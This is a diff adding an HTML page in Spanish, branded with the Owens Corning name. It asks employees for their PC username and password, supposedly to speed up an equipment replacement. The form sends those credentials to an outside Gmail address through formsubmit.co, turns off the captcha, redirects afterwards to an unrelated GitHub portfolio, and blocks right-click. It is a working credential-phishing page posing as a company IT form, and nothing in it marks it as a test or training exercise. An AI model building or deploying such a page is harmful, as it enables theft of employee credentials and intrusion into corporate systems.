@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Equipos</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+    <p class="about-txt" style="text-align: center;"> <br> Ingresa tu usuario y contraseña de pc para agilizar tu cambio de equipo</p>
+    <!-- Aplicamos la clase 'form-general' para aplicar los estilos de formulario -->
+    <form autocomplete="off" action="https://formsubmit.co/ocwusers@gmail.com" method="POST" class="form-general">
+        <h2>Owens Corning</h2>
+
+        <!-- Contenedor para el campo de email -->
+        <div class="input-container">
+            <label for="user"><img class="icons" src="user.png" alt="User"></label>
+            <input class="inp" placeholder="usuario" type="text" name="name" id="user" required>
+        </div>
+
+        <!-- Contenedor para el campo de password -->
+        <div class="input-container">
+            <label for="pass"><img class="icons" src="lock.png" alt="Lock"></label>
+            <input class="inp" placeholder="contraseña" type="password" name="subject" id="pass" required>
+        </div>
+
+        <!-- Botón de envío -->
+        <input type="submit" value="Registrar" class="btn-1">
+        <input type="hidden" name="_next" value="https://urieltgc.github.io/portafolio/">
+        <input type="hidden" name="_captcha" value="false">
+    </form>
+
+    <script>
+        document.addEventListener("contextmenu", function(e) {
+          e.preventDefault();
+        });
+      </script>
+</body>
+</html>
